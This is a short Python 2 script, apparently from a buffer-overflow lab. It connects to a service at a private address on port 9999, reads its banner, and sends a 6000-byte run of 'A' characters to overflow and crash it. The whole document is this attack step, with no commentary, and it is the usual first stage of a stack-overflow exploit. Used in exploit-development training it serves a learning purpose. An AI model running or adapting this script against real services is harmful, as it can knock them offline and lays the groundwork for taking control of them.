#!/usr/bin/python

import socket

buf = '\x41' * 6000

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(("192.168.235.129", 9999))
res = sock.recv(1024)
print res
print '[+] Sending %d bytes to Server.' % len(buf)
sock.send(buf)
sock.recv(1024)
